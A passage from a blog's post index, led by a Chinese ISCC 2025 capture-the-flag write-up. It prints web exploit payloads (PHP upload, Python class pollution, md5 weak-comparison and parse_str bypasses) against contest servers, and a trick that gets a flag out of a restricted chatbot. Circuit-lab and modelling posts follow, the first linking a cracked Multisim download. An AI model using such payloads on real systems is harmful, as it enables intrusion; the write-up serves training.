AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://112.126.73.173:49102/upload.php?chuizi=uploads/2.txt Accept-Encoding: gzip, deflate, br Connection: keep-alive  ------WebKitFormBoundaryBZA4W8JyBuKQkfZf Content-Disposition: form-data; name=\"file\"; filename=\"2.txt\" Content-Type: text/plain  &lt;?php highlight_string(\"/var/www/html/includes/flag.php\"); ------WebKitFormBoundaryBZA4W8JyBuKQkfZf--   在各个位置尝试chuizi，最终在根目录获得：  SVNDQ3taaDFKMUBZMV8xc181MF9GdW59   base64解码  ISCC{Zh1J1@Y1_1s_50_Fun}   究竟考什么呢  根据提示进入/SQL目录，获得代码：          class T4yM7a0VbJ():             def __init__(self):                 4rGkL8B3qT = SVNDQ3tGYWtlX2ZsYWd9         J5cMf90xQN = T4yM7a0VbJ()         def kzmtoa(abc, defi):             for g, h in abc.items():                 if hasattr(defi, '__getitem__'):                     if defi.get(g) and type(h) == dict:                         kzmtoa(h, defi.get(g))                     else:                         defi[g] = h                 elif hasattr(defi, g) and type(h) == dict:                     kzmtoa(h, getattr(defi, g))                 else:                     setattr(defi, g, h)         def W9hT7c2fL0(I3q0Jk8sX7 = True, M8f6Uv3zG4 = True, S1t5Lm9cE2 = False, * , H4b3Qn7iA0 = True):             if S1t5Lm9cE2:                 if M8f6Uv3zG4:                     return '这里没有答案'                 else:                     return T7c1Ea4yJ9             else:                 return '这里没有答案'         def w6F7zV1sEp(A5d8Lt3sM1):             if isinstance(A5d8Lt3sM1, list):                 return tuple(w6F7zV1sEp(item) for item in A5d8Lt3sM1)             elif isinstance(A5d8Lt3sM1, dict):                 return {key: w6F7zV1sEp(value) for key, value in A5d8Lt3sM1.items()}             else:                 return A5d8Lt3sM1         @app.route('/9kU4jO6cBz',methods=['POST', 'GET'])         def p0D6Ea2iYb():             if request.data:                 kzmtoa(w6F7zV1sEp(json.loads(request.data)), J5cMf90xQN)             return W9hT7c2fL0()   考察原型链污染，构造payload  {\"__class__\": {\"__init__\": {\"__globals__\": {\"W9hT7c2fL0\": {\"__kwdefaults__\": {\"I3q0Jk8sX7\" : true, \"M8f6Uv3zG4\" : false, \"S1t5Lm9cE2\" : ture}} }}}}   获得账号密码  F6vN+1bY9wC!Q2*aT-9e5KcU 4gD7X(SOM#pR8*rJ3+Wf6iGt   进入下一题，同理   def kzmt0a(W1pS7h2eYq):                     F4yU7rA2sW = (W1pS7h2eYq + \"abcdefg\").replace(\"a\", \"z\")                     return F4yU7rA2sW                  def kzrntoa(M2dH8iY0fR):                     E1xK9uS4jC = hashlib.md5(M2dH8iY0fR.encode('utf-8')).hexdigest()                     return E1xK9uS4jC                  def kzrnt0a(T3aF5cR0eY, * , fG2Wt8vDm6 = 'J8rM1tZ2sP', Z4bP9x1cTi = False):                     if Z4bP9x1cTi:                         if fG2Wt8vDm6 != T3aF5cR0eY:                             return '不太对吧！'                         else:                             return Q9eX3jA5nL                     else:                         return '不太对吧！'                 @app.route('/j7K0Ov5dLc',methods=['POST', 'GET'])                 def K1tH0fY7rM():                     W5aF6cR9eT = \"try\"                     if request.data:                         kzmtoa(json.loads(request.data), J5cMf90xQN)                     return kzrnt0a(kzrntoa(kzmt0a(W5aF6cR9eT)))   按照函数逻辑，构建字符串tryabcdefg，替换字符变为tryzbcdefg，MD5编码2D692448124C16E4E4AFDD7FAEF34242  构造payload  {\"__class__\": {\"__init__\": {\"__globals__\": {\"kzrnt0a\": {\"__kwdefaults__\": {\"fG2Wt8vDm6\": \"2d692448124c16e4e4afdd7faef34242\", \"Z4bP9x1cTi\": true}}}}}}   获得flag  ISCC{TnxGj)9UfN=9*myGUp*t}   开门大吉  通过图片得知第一首歌为：有爱就不怕  第二关得到提示“jiushizhjeshouge”，                  &lt;?php                 $charMap = [                     'a' =&gt; 'q', 'b' =&gt; 'w', 'c' =&gt; 'e', 'd' =&gt; 'r', 'e' =&gt; 't', 'f' =&gt; 'y', 'g' =&gt; 'u', 'h' =&gt; 'i', 'i' =&gt; 'o',                     'j' =&gt; 'p', 'k' =&gt; 'a', 'l' =&gt; 's', 'm' =&gt; 'd', 'n' =&gt; 'f', 'o' =&gt; 'g', 'p' =&gt; 'h', 'q' =&gt; 'j', 'r' =&gt; 'k',                     's' =&gt; 'l', 't' =&gt; 'z', 'u' =&gt; 'x', 'v' =&gt; 'c', 'w' =&gt; 'v', 'x' =&gt; 'b', 'y' =&gt; 'n', 'z' =&gt; 'm'                 ];                 $correctAnswer = '???';                 $mappedAnswer = '';                 for ($i = 0; $i &lt; strlen($correctAnswer); $i++) {                     $char = $correctAnswer[$i];                     $mappedAnswer.= $charMap[$char];                 }                 $shiftedAnswer = str_rot13($mappedAnswer);                 $finalCorrectValue = base64_encode($shiftedAnswer);                  $finalCorrectValue = 'ZmJr';                  if (isset($_GET['kaisa'])) {                     $input = $_GET['kaisa'];                     $mappedInput = '';                     for ($i = 0; $i &lt; strlen($input); $i++) {                         $char = $input[$i];                         $mappedInput.= $charMap[$char];                     }                     $shiftedInput = str_rot13($mappedInput);                     $encodedInput = base64_encode($shiftedInput);                      if ($encodedInput === $finalCorrectValue) {                         echo \"kaisa只用在第二关，它能用在哪里？\";                     } else {                         echo \"输入错误，kaisa究竟等于多少呢？\";                     }                 }                 ?&gt;   结合“kaisa”考虑为凯撒加密  得到dcombctbymbioay，成功进入/2she2  第三关发现为SSTI，对shePOST参数发现没有回显  最后参考Jinja2-SSTI通过Server请求头带出命令回显-先知社区，构造payload     得到flag  ISCC{zK_!1&amp;c3lQEL(9,sfdzq}   哪吒的试炼  根据提示“食物”、“吃藕”，猜测Get参数为?food=lotus root  输入后进入http://112.126.73.173:9999/isflag.php，经过代码审计发现可疑请求  于是访问http://112.126.73.173:9999/isflag.php?source=true，获得代码：  &lt;?php if (isset($_POST['nezha'])) { $nezha = json_decode($_POST['nezha']);  $seal_incantation = $nezha-&gt;incantation;   $md5 = $nezha-&gt;md5;   $secret_power = $nezha-&gt;power;  $true_incantation = \"I_am_the_spirit_of_fire\";     $final_incantation = preg_replace(  \"/\" . preg_quote($true_incantation, '/') . \"/\", '',  $seal_incantation  );    if ($final_incantation === $true_incantation &amp;&amp; md5($md5) == md5($secret_power) &amp;&amp; $md5 !== $secret_power) {  show_flag();   } else {  echo \"&lt;p&gt;封印的力量依旧存在，你还需要再试试!&lt;/p&gt;\";  }  } else {  echo \"&lt;br&gt;&lt;h3&gt;夜色渐深，风中传来隐隐的低语……&lt;/h3&gt;\";  echo \"&lt;h3&gt;只有真正的勇者才能找到破局之法。&lt;/h3&gt;\";  }  ?&gt;   preg_replace部分构造嵌套字符串incantation=II_am_the_spirit_of_fire _am_the_spirit_of_fire  md5($md5) == md5($secret_power) &amp;&amp; $md5 !== $secret_power是弱比较，构造科学计数法绕过：  md5 = s1836677006a  secret_power = s1665632922a import requests   url = \"http://112.126.73.173:9999/isflag.php\" payload = { \"nezha\": '{\"incantation\": \"II_am_the_spirit_of_fire_am_the_spirit_of_fire\", \"md5\": \" s1836677006a \", \"power\": \" s1665632922a \"}' }   response = requests.post(url, data=payload) print(response.text)  获得明=suoom 李=woolihc ISCC{早晴枫林红}  其中“明”=日+月=sun+moon可以看作两个单词首尾相接，李=木+子=wood+child同理  可以得到flag  sun ten sun green wood wind wood wood silk work  最终flag为ISCC{suetsueergwooniwwoooowsilrow}  回归基本功  根据提示“用户代理”选择合适的英雄“高级工程师佛耶格”  ​  输入后进入http://112.126.73.173:9998/Q2rN6h3YkZB9fL5j2WmX.php  &lt;?php show_source(__FILE__); include('E8sP4g7UvT.php'); $a=$_GET['huigui_jibengong.1']; $b=$_GET['huigui_jibengong.2']; $c=$_GET['huigui_jibengong.3']; $jiben = is_numeric($a) and preg_match('/^[a-z0-9]+$/',$b); if($jiben==1) { if(intval($b) == 'jibengong') { if(strpos($b, \"0\")==0) { echo '基本功不够扎实啊！'; echo '&lt;br&gt;'; echo '还得再练！';  } else { $$c = $a; parse_str($b,$huiguiflag); if($huiguiflag[$jibengong]==md5($c)) { echo $flag; } else{ echo '基本功不够扎实啊！'; echo '&lt;br&gt;'; echo '还得再练！';  } }  } else { echo '基本功不够扎实啊！'; echo '&lt;br&gt;'; echo '还得再练！';  } } else { echo '基本功不够扎实啊！'; echo '&lt;br&gt;'; echo '还得再练！';  } ?&gt; 基本功不够扎实啊！ 还得再练！   php8版本以前，[会解析成下划线，且之后的点、空格等不会再被解析。url传参时，变量名中的点、空格，会解析成下划线，因而[可以使后面的解析失效。  Strpos用%0A换行符绕过。同时为了绕过正则，给b增加多个参数，最终payload http://112.126.73.173:9998/Q2rN6h3YkZB9fL5j2WmX.php?huigui[jibengong.1=1&amp;huigui[jibengong.2= p=p%261=e559dcee72d03a13110efe9b6355b30d&amp;huigui[jibengong.3=jibengong  ISCC{U8oO(O$!twP5Vg~^9J@4}  ShallowSeek  访问http://112.126.73.173:49111/api/chat.php得到：  {“response”:”\\u6211\\u53ea\\u662f\\u4e2a\\u672c\\u5730\\u52a9\\u624b\\uff0c\\u61c2\\u5f97\\u4e0d\\u591a\\u54e6~”}  当问及f1@g，ShallowSeek 说：你想干嘛？！我的开发者限制了这一行为！  输入f1@g.txt忽略开发者限制：ShallowSeek 说：01_cu_5_3r35_th3b5t!}  根据提示原文：WebIsEasy，密钥：4351332，密文：IbaWEssey  滕王阁序中387531189疑似密钥  ShallowSeek的好朋友AJAX好想要个头啊，X开头的最好了提示可能是X开头的请求头，AJAX 请求头为X-Requested-With: XMLHttpRequest  然后访问  ISCC{0p3n01_cu_5_3r35_th3b5t!}  然后利用提示解密  ISCC{0p3n_50urc3_15_th3_b35t!}  MISC  书法大师  查看图片16进制内容，发现有隐写，提取部分为一个加密的压缩包，内容为message14.txt  通过查看图片备注得到压缩包密码L9k8JhGfDsA  解压缩得到   艾个 正虫 不旗 中牛 正一 大卫 串不 个虫 那生 尘罪 正那 尖故 乐入 中走 大切 小乙 生个 自曾 片卜 功国 自尖 艾乙 小数 女蓝   注意到每个字符的笔画个数都不超过16，猜测为16进制编码  53 56 4E 44 51 33 74 36 65 6D 56 69 52 47 34 31 53 6C 42 58 66 51 3C 3C                 通过解码再进行ascii编码得到  SVNDQ3t6emViRG41SlBXfQ==   base64解码  ISCC{zzebDn5JPW}   反方向的钟  在文本不起眼的v我50中得到  D﻿‏‎​﻿‍‎​‍﻿﻿​‍﻿﻿​‌‎‎​‏﻿‍​‌‎‎​‌‎‍​‌﻿‏​‌‍‍​‌‍﻿​﻿﻿‎x8CBEljC2wtHDRBWzhaFUBN   发现有0宽字符，解码得到：  Dx8CBEljC2wtHDRBWzhaFUBN iscc2025GDEx   考虑第一行为加密文字，下一行为密钥  尝试一些常见的加密方法，在异或时发现得到前四位为flag，为有效信息，故尝试异或加密  解码得到flag  import base64 encrypted_text = 'Dx8CBEljC2wtHDRBWzhaFUBN' key = 'iscc2025GDEx' encryptedbytes = base64.b64decode(encrypted_text) keybytes = key.encode('utf-8') decryptedbytes = bytes([encryptedbytes[i] ^ keybytes[i % len(keybytes)] for i in range(len(encryptedbytes))]) flag = decryptedbytes.decode('utf-8') print(flag)   ISCC{S9YjXq92K9vr}   REVERSE  我爱看小品  获得的附件为something，无显著特征  通过die发现是elf文件，在IDA中发现多次出现含“py”字样的函数，考虑可能为pyinstaller打包后的文件  通过pyinstxtractor解包得到  import mypy, yourpy  def something():     print(\"  打工奇遇\")     print(\"宫室长悬陇水声\")     print(\"廷陵刻此侈宠光\")     print(\"玉池生肥咽不彻\")     print(\"液枯自断仙无分\")     print(\"酒醒玉山来映人\")   def check():     your_input = input()     if your_input[None[:5]] == \"ISCC{\" and your_input[-1] == \"}\":         print(\"Come along, you'll find the answer!\")     else:         print(\"Flag is wrong!\")   if __name__ == \"__main__\":     mypy.myfun()     something()     print(\"Please enter flag:\")     check()   以及在其他文件中得到密码为yibaibayibei1801  进入动态调试，直接运行程序，输入密码  得到flag  ISCC{pyinstaller_is_very_interesting}   SP  根据题目提示，程序应当有壳，通过查壳发现为upx，利用upx脱壳工具https://www.52pojie.cn/thread-2026356-1-1.html得到程序，进入IDA，找到主程序，发现可疑函数obfDB()    在return处打上断点，动态调试查看结果    发现  Stack[00005AB8]:000000000079FCE0 db  49h ; I Stack[00005AB8]:000000000079FCE1 db  53h ; S Stack[00005AB8]:000000000079FCE2 db  43h ; C Stack[00005AB8]:000000000079FCE3 db  43h ; C Stack[00005AB8]:000000000079FCE4 db  7Bh ; { Stack[00005AB8]:000000000079FCE5 db  4Dh ; M Stack[00005AB8]:000000000079FCE6 db  38h ; 8 Stack[00005AB8]:000000000079FCE7 db  24h ; $   同理继续断点得到后半部分flag  最终  ISCC{M8$L!pX#c^@q}   MOBILE  Encode  下载apk后，选择lib/x86_64/libencode与lib/x86/libencode拖入IDA进行分析  发现一些函数  simple_base64_encode(uchar const*,int) encode_last_part(std::string const&amp;) encode_front_part(std::string const&amp;)   可以认为本题似乎将flag分为两部分处理  对于前半部分：  ...     do     {       v6 = v3;       std::string::push_back(&amp;v12, v4[v5++] ^ 0x2F);       v3 = v6;     }     while ( v6 != v5 );     v7 = v12;     v8 = (char *)v13;   }   else   {     v8 = 0;     v7 = 0;   }   v9 = (v7 &amp; 1) == 0;   v10 = (char *)&amp;v12 + 1;   if ( !v9 )     v10 = v8;   simple_base64_encode(a1, (int)v10); ...   可以认为先对字符串进行异或0x2F，再进行base64加密  对于后半部分可以认为先对字符串进行操作，再反序。本题测试发现代码逻辑为给所有字符+3.  发现两个可疑函数Java_com_example_encode_MainActivity_nativeCheckLast和Java_com_example_encode_MainActivity_nativeCheckFormat  在后者中发现可疑变量xmmword_14580          v18 = _mm_xor_si128(_mm_loadu_si128(v17), (__m128i)xmmword_14580);   其中xmmword_14580对应ascii  a29dRGJvSA5McAAA   在前者函数发现可疑}udwV)uCZ字符串  根据代码逻辑有：  import base64 _front=base64.b64decode(\"a29dRGJvSA5McAAA\") for i in _front:     print(chr(i^0x2f),end='')  _last=[ord(i) for i in '}udwV)uCZ'] for i in range(len(_last)):     part2[i]-=3 for i in range(len(_last)-1,-1,-1):     print(chr(_last[i]),end='')   得到D@rkM@g!c_//W@r&amp;Starz，再根据代码逻辑，删除\\\\  最终  ISCC{D@rkM@g!c_W@r&amp;Starz}   ###"
  },
  
  {
    "title": "全过程电路分析基础实验",
    "url": "/posts/ea-a/",
    "categories": "Blogs",
    "tags": "blogs, electronic, Circuit Analysis, hardware",
    "date": "2025-04-28 19:50:00 +0800",
    "content": "考虑到我所在的第三波实验是在十一周（2025年5月6日-5月9日）和十二周（2025年5月12日-5月13日），彼时电分应当进入了尾声，为了能够连贯的复习电分，我偷偷蹭了第二波实验时间（2025年4月23日-25日）完成了此次实验。不做不知道，一做吓一跳，这电分实验十分消耗精力，现在看来，提前实验确实是一个很明智的选择。  这篇博客用来记录一下我的实验过程（以及踩坑的过程）。  一、实验原理  实验原理在老师给到的讲义中已经写得非常明白，可以直接下载预习讲义；  此外，CSDN上有一篇博客与实验内容几乎完全一致，可以直接进行参考：常见模拟电路设计 一（含仿真）：方波、三角波、正弦波的互相发生_三角波产生电路的设计与仿真-CSDN博客。  一篇文章教你使用运放实现三角波、方波（详细电路分析）+multisim仿真-电子工程专辑也是一个很好的选择。  二、电路设计  1、方波  由于要求方波的频率在到之间连续可调，并且幅度为，于是通过公式进行计算： \\(T=2RC\\ln{(1+\\frac{2R_1}{R_2})}\\) 其中 \\(\\begin{cases}  R_1 = 10kΩ \\\\  R_2 = 10kΩ \\\\  C = 0.47μF \\\\ \\end{cases}\\) 可以将式子化简为： \\(T = 2\\ln{3} RC\\) 之后根据要求计算最大频率与最小频率下对应的电阻： \\(\\begin{cases}  f_{max} = \\frac{1}{2\\ln3 R_{min} C} = 300Hz \\\\  f_{min} = \\frac{1}{2\\ln3 R_{max} C} = 100Hz \\\\ \\end{cases}\\) 解得： \\(\\begin{cases}  R_{min} = 3.23kΩ\\\\  R_{max} = 9.86kΩ\\\\ \\end{cases}\\)  2、三角波  由于要求在的条件下生成三角波，因而在后续电路中，以方波频率为的情况设计电路。 \\(U_0(t) = -\\frac{1}{RC}\\int_{-\\infty}^{t}u_i(\\xi)d\\xi\\) 由于已经限制电容大小： \\(C= 0.47μF\\) 经过计算可以得出： \\(R = R_0 ≈ 3.5kΩ\\) 应当有良好的三角波。此外由于运算放大器不是理想的，为防止低频信号增益过大，通常在电容两端并联一个电阻，用以减少运算放大器的直流偏移，但同时也会影响积分的线性关系。一般: \\(R_F &gt; 10R\\) 在此次实验中： \\(R_F = 100kΩ\\)  3、正弦  按照讲义给到的一阶有源低通滤波电路在生成正弦波中的用法，本次实验可以利用一阶有源低通滤波电路将三角波转化为正弦波。然而为了使滤波效果良好，本次实验采用二阶有源低通滤波电路，计算确定当： \\(\\begin{cases} R= 1.54kΩ \\\\ C = 0.47μF \\end{cases}\\) 时可以产生良好的正弦波信号。  三、仿真软件  该实验采用Multisim进行实验，目前的大版本是14，可以在网上找到破解版或者在官方网站下载试用版。  这篇文章：Multisim14中文版【Multisim14下载地址】简体中文版安装图文教程 - 知乎详细的介绍了破解版的下载与安装方法，其中下载链接为百度网盘的分享内容，解压密码为admincxz。  也可以在官网Multisim Download - NI下载教育版，或者下载专业版的试用版。这里如果在百度搜索，基本无法找到Multisim的官网，请前往bing（必应）。  如果使用了第一种方法，或者以其他办法下载到了Multisim14.0或14.1版本，那么很可能你的软件打开后会出现显示问题，菜单很小，用着很难受。    这是因为软件出现了兼容性问题，按照如下步骤可以解决：  右键软件，选择属性，找到兼容性/更改高DPI设置/高DPI缩放替代/系统(增强)，选择，保存，即可。      修改好后有如下图的效果，现在软件用起来就会十分顺手。    对于软件的操作使用，在CSDN上有博客电路仿真实验—Multisim十分钟入门使用介绍（适合新手）-CSDN博客写得很全面，但是没必要认真学习，该软件设计的很人性化，实际上所有的功能都很方便摸索出来。  需要注意的是示波器的使用，+接到波形产生的位置，-直接接地即可。  另外需要注意的是，讲义中给到的运放是LM324D，但是发到手里的运放是LM324N，一定要注意。  理论设计图如下：    但是实际上实验室中，并没有这么多供你选择的电阻，因而有如下的改进：    四、实际操作  实际操作中，注意焊接时不要将两个针脚连在一起，也不要让元器件在PCB板顶部接触到任何金属部分，也不要用手触碰任何针脚，这样才会保证你的板子不会短路。  如下是我实现了必修项目的面包板和PCB板。      五、注意事项  1、波形    如果方波不方，通常设计的时候，分压电阻阻值过大或者过小导致的，一般建议分压电阻的阻值在10k数量级，不要超过100k，也不要小于1k。  如果正弦波呈现方波样式，很可能是被削顶了，这说明你在前面的电路中电压过大，应该调整三角波的峰峰值。如果想了解原理，可以查看正弦波经过运放有时会变成方波? - 知乎。  如果方波的峰峰值在6V而不是要求的4V，可能是由于分压电阻被短路导致的，这时候需要检查电阻是否有误触，混连等状况。  2、焊接  如果焊锡过多，自己无法去除，在时间允许的情况下，可以购买便宜的吸焊器临时救急。【创客工具】创客必备工具之吸锡器 - 知乎  烙铁头如果不便焊接，可以找一个带松香的焊台，尝试沾完松香再焊接。  六、附加题  等待更新"
  },
  
  {
    "title": "2025统计建模复盘",
    "url": "/posts/25tong/",
    "categories": "Mathematics Modeling",
    "tags": "math, python",
    "date": "2025-04-21 00:00:00 +0800",
    "content": "Intro  统计建模大赛实际上是无心插柳柳成荫，本来我们打算以统计建模为练手项目，为后面三次数学建模校赛打基础，但由于种种原因（拖延症），在第一次校赛结束后我们才开始了建模工作。  与数学建模不同的是，统计建模不提供题目，要求自行选题，自行寻找数据，自行建模。看似给了很大的发挥空间，实际却恰恰相反，我们如同无头苍蝇，单单针对如何选题就讨论了四五天，且没有任何进展。  最开始的选题是城市文化与旅游方面，但考虑到我们并不具备大规模爬虫爬取数据的能力，最终放弃了这个选题；最后临近截止日期时，我们决定用主办方提供的数据库中的现成数据来思考题目，结合相关政策与新闻热点，最终敲定了“绿色发展与城镇化相协调”这类型的选题。  最终定题为“城镇化与绿色发展的动态耦合:基于双指数体系的“宜居家园”建设评估”，摘要如下：     2025年《政府工作报告》中指出，要加快发展绿色低碳经济，积极推进美丽中国先行区建设。国务院印发的《新时代的中国绿色发展》白皮书，全面总结了党的十八大以来我国推进绿色发展的理念、实践和成效，强调要“建设生态宜居美丽家园”。建设生态宜居美丽城市，关系着人民的生活幸福指数，体现以人民为中心的发展理念。为响应此战略要求，全面、准确地评估“美丽家园”的建设进程，并对未来进一步发展进行预测，可以为政策制定、资金配置等提供切实的科学依据，为全面推进美丽城市建设提供行动指引，助力美丽中国建设。    在过去的研究中，评估城市建设水平往往以传统的经济和城镇化水平等指标为主，不能有效协调生态、社会服务、城镇化等指数的动态联系。在生态宜居美丽家园建设思想的指导下，本研究构建了城市化指数（UI）与绿色指数（GI）的双指数评价体系，旨在量化评估全国各省级行政区“生态宜居美丽家园”建设进程。其中，城市化程度反映基础设施与公共服务水平，而绿色指数反映了生态环境质量与资源利用效率。本文采用熵权法对基础设施、空间扩展等客观指标赋权，构建城市化指数（UI）；确定污染治理、生态建设等主观指标的权重，形成绿色指数（GI）。运用K-means聚类揭示区域发展差异：东部省份平均协调度（0.72）显著高于中西部（0.41），其中浙江省以0.85位列全国首位。据此提出“动态财政补偿机制”与“省级绿色基建负面清单”政策建议，为统筹城镇化与生态保护提供科学依据。   这样一套“赶工”出的作品最终居然获得了校级二等奖和省（直辖市）级三等奖，着实令人以外，所以在比赛结束后我认为有必要对其进行复盘与分析，总结一些经验。  理论分析  创新点  本文采用改进的熵权法，引入PCA主成分分析、Logistic处理、趋势因子，更加全面动态地构建评价指标。通过K-means聚类揭示各个指标间的关系。  研究方法如图  指标选取  为了使最终指数能够尽可能覆盖城市化发展的各个方面，选取如下指标：  城镇化指数（UI）指标选取                 维度       指标名称（单位）       选择理由                       人口集聚       人口密度（人/ km²）       直接反映城市人口承载强度和集聚效应                 基础设施       供水管道密度（城建区km/km²）       衡量市政管网覆盖能力                         人均道路面积（m²/人）       表征交通基础设施完善度                 土地利用       城市建设用地面积（km²）       反映城市空间扩展程度                 经济投入       固定资产投资额（亿元）       体现城市建设资本投入强度                 公共设施       道路照明灯数（盏）       表征城市公共照明服务能力           表2 绿色指数（GI）指标选取                 维度       指标名称（单位）       选择理由                       绿化空间       绿化覆盖率（%）       衡量绿化总量                 人均公园绿地面积       反映服务可及性                         污染治理       污水处理率（%）       住建部”城市黑臭水体治理攻坚战”核心指标                         生活垃圾无害化处理率（%）                         资源循环       污水再生率（%）       直接体现水资源可持续利用水平                 清洁能源       燃气普及率（%）       表征清洁能源替代传统燃煤进程           代码  下面代码展示了论文的核心算法，详细功能在注释中已经给出  # -*- coding: utf-8 -*- import pandas as pd import numpy as np from sklearn.decomposition import PCA from sklearn.cluster import KMeans from sklearn.impute import SimpleImputer from prophet import Prophet import matplotlib.pyplot as plt import os import logging plt.rcParams[\"font.sans-serif\"] = [\"SimHei\"]  # 设置字体 plt.rcParams[\"axes.unicode_minus\"] = False  # 正常显示负号  # ================== 配置参数 ================== DATA_DIR = './province_data/'    # 原始数据存放目录 OUTPUT_DIR = './results_pca/'    # 结果输出目录 PROVINCES = [     '河北', '山西', '辽宁', '吉林', '黑龙江', '江苏',     '浙江', '安徽', '福建', '江西', '山东', '河南',     '湖北', '湖南', '广东', '海南', '四川', '贵州',     '云南', '陕西', '甘肃', '青海',      '内蒙古', '广西', '西藏', '宁夏',     '新疆' ]  # 配置日志 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')  # ================== 核心函数增强版 ================== def robust_load_data(province):     \"\"\"修正版数据加载与预处理\"\"\"     try:         file_path = os.path.join(DATA_DIR, f\"{province}.csv\")                  # 加载数据并确保时间排序         df = pd.read_csv(file_path, parse_dates=['时间'], encoding='utf-8')         df = df.sort_values('时间')  # 确保时间有序                  # 列名标准化处理         df.columns = [col.split(':')[0].strip().replace(' ', '') for col in df.columns]                  # 定义核心指标列         required_cols = [             '时间', '人口密度', '供水管道密度', '人均道路面积',             '城市建设用地面积', '固定资产投资额', '污水处理率',             '无害化处理率', '人均公园绿地面积', '绿化覆盖率', '污水再生率'         ]         existing_cols = [col for col in required_cols if col in df.columns]         df = df[existing_cols]                  # 时间序列线性插值         numeric_cols = [col for col in existing_cols if col != '时间']         df[numeric_cols] = df[numeric_cols].interpolate(method='linear', limit_direction='both')                  # 处理剩余缺失值         if df[numeric_cols].isna().sum().sum() &gt; 0:             imputer = SimpleImputer(strategy='mean')             df[numeric_cols] = imputer.fit_transform(df[numeric_cols])             logging.warning(f\"{province} 使用均值填充剩余缺失值\")                      return df     except Exception as e:         logging.error(f\"加载 {province} 失败: {str(e)}\")         return None  def enhanced_entropy_weights(data, indicators):     \"\"\"增强型熵权法计算\"\"\"     try:         # 标准化处理         normalized = (data[indicators] - data[indicators].min() + 1e-8) / \\                     (data[indicators].max() - data[indicators].min() + 1e-8)                  # 计算熵值         p = normalized / (normalized.sum(axis=0) + 1e-8)         entropy = (-1 / np.log(len(data))) * (p * np.log(p + 1e-8)).sum(axis=0)                  # 计算权重         weights = (1 - entropy) / (1 - entropy).sum()         return weights     except Exception as e:         logging.error(f\"权重计算失败: {str(e)}\")         raise  def process_province(province):     \"\"\"增强版处理流程\"\"\"     try:         # 1. 加载数据         df = robust_load_data(province)         if df is None:             return None                      # 2. PCA处理         pca_cols = ['人口密度', '城市建设用地面积']         if all(col in df.columns for col in pca_cols):             pca = PCA(n_components=1)             df['人口密度_PCA'] = pca.fit_transform(df[pca_cols])         else:             logging.warning(f\"{province} 缺少PCA所需列\")             df['人口密度_PCA'] = df.get('人口密度', 0)  # 降级处理                      # 3. 定义指标体系         ui_indicators = ['人口密度_PCA', '供水管道密度', '人均道路面积', '固定资产投资额']         gci_indicators = ['污水处理率', '无害化处理率', '人均公园绿地面积', '绿化覆盖率']                  # 4. 计算权重         ui_weights = enhanced_entropy_weights(df, ui_indicators)         gci_weights = enhanced_entropy_weights(df, gci_indicators)                  # 5. 计算指数         def safe_normalize(data, cols):             return (data[cols] - data[cols].min()) / (data[cols].max() - data[cols].min() + 1e-8)                      df['UI'] = (safe_normalize(df, ui_indicators) * ui_weights).sum(axis=1)         df['GCI'] = (safe_normalize(df, gci_indicators) * gci_weights).sum(axis=1)                  # 6. 保存结果         os.makedirs(os.path.join(OUTPUT_DIR, \"results\"), exist_ok=True)         output_path = os.path.join(OUTPUT_DIR, \"results\", f\"{province}_结果.csv\")         df.to_csv(output_path, index=False, encoding='utf-8')         logging.info(f\"{province} 处理成功\")         plt.figure(figsize=(10,6))         plt.plot(df['时间'], df['UI'], label='UI指数')         plt.plot(df['时间'], df['GCI'], label='GCI指数')         plt.title(f'{province}双指数发展趋势')         plt.legend()         plt.savefig(os.path.join(OUTPUT_DIR, f'{province}_趋势图.png'))         return df              except Exception as e:         logging.error(f\"处理 {province} 失败: {str(e)}\")         return None  def enhanced_cluster_analysis():     \"\"\"增强版聚类分析\"\"\"     try:         # 收集数据         all_data = []         for p in PROVINCES:             result_file = os.path.join(OUTPUT_DIR, \"results\", f\"{p}_结果.csv\")             if os.path.exists(result_file):                 df = pd.read_csv(result_file, parse_dates=['时间'])                 latest = df[df['时间'] == df['时间'].max()]                 latest['省份'] = p                 all_data.append(latest)                          if not all_data:             raise ValueError(\"无有效数据可供分析\")                      combined = pd.concat(all_data)                  # 检查数据质量         if combined[['UI', 'GCI']].isna().sum().sum() &gt; 0:             combined = combined.fillna(combined.mean())                      # K-Means聚类         kmeans = KMeans(n_clusters=4, random_state=42)         combined['类别'] = kmeans.fit_predict(combined[['UI', 'GCI']])                  # 可视化         plt.figure(figsize=(12, 8))         scatter = plt.scatter(combined['UI'], combined['GCI'],                              c=combined['类别'], cmap='tab10', s=100)         plt.xlabel('城市化指数(UI)', fontsize=14)         plt.ylabel('绿色城市指数(GCI)', fontsize=14)         plt.title('各省份发展模式聚类分析', fontsize=16)         plt.colorbar(scatter).set_label('类别', fontsize=12)                  # 标注省份名称         for i, row in combined.iterrows():             plt.text(row['UI']+0.01, row['GCI']+0.01, row['省份'],                      fontsize=8, alpha=0.7)                              os.makedirs(os.path.join(OUTPUT_DIR, \"plots\"), exist_ok=True)         plt.savefig(os.path.join(OUTPUT_DIR, 'plots', '全国聚类分析.png'), dpi=300, bbox_inches='tight')         plt.close()                  # 保存结果         combined.to_csv(os.path.join(OUTPUT_DIR, 'results', '全国分类结果.csv'),                         index=False, encoding='utf-8')         logging.info(\"聚类分析完成\")              except Exception as e:         logging.error(f\"聚类分析失败: {str(e)}\")  # ================== 主程序 ================== if __name__ == \"__main__\":     # 初始化目录     os.makedirs(OUTPUT_DIR, exist_ok=True)          # 处理所有省份     for province in PROVINCES:         process_province(province)          # 执行聚类分析     enhanced_cluster_analysis()          logging.info(\"===== 全部处理完成 =====\")     print(f\"结果文件路径: {os.path.abspath(OUTPUT_DIR)}\")   反思  很明显这次建模吃了选题红利，在建模方法并没有很突出的情况下，凭借着选题优势拿到了这些奖项。在写代码的过程中还出现了一些小插曲，比如对numpy和pandas库不熟悉，导致csv处理困难等等。  我认为在当下这个人工智能高速发展的时代，我们一定要从人工智能中学习到真本事。不能作为人工智能产物的搬运工。在本次比赛中我们借助人工智能完善了代码，但个人能力并没有显著提高，掌握这些代码方法的是AI不是个人。我们应当从AI反馈的结果中学习，形成自己的核心技术。"
  },
  
  {
    "title": "2025数学建模第一次校赛复盘",
    "url": "/posts/25school1/",
    "categories": "Mathematics Modeling",
    "tags": "math, python",
    "date": "2025-04-06 23:50:00 +0800",
